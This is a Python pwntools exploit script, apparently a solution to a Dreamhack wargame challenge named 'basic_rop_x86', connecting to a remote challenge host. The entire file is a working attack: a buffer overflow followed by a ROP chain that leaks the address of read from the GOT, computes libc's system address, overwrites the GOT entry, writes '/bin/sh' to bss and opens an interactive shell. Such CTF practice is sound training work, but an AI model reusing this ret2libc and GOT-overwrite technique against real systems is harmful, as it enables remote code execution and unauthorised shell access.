from pwn import *

context.log_level = 'debug'

# p = process('./basic_rop_x86')
libc = ELF('./libc.so.6')
p = remote("host3.dreamhack.games", 8567)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6') # 'ldd basic_rop_x86' 로 확인
e = ELF('./basic_rop_x86')

# address
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pppr = 0x08048689
pr = 0x080483d9
bss = e.bss()

payload = b"A" * 0x44 + b"B" * 0x4

# write(1, read_got, 4)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1) + p32(read_got) + p32(4)

# # read(0, bss, 8)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0) + p32(bss) + p32(8)

# read(0, read_got, 4)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0) + p32(read_got) + p32(4)

# read("/bin/sh")
payload += p32(read_plt)
payload += p32(pr)
payload += p32(bss)

p.send(payload)
p.recvn(0x40)

read = u32(p.recvn(4))
system = read - libc.symbols['read'] + libc.symbols['system']
print(hex(read))

p.send(b"/bin/sh\x00")
p.send(p32(system))
p.interactive()
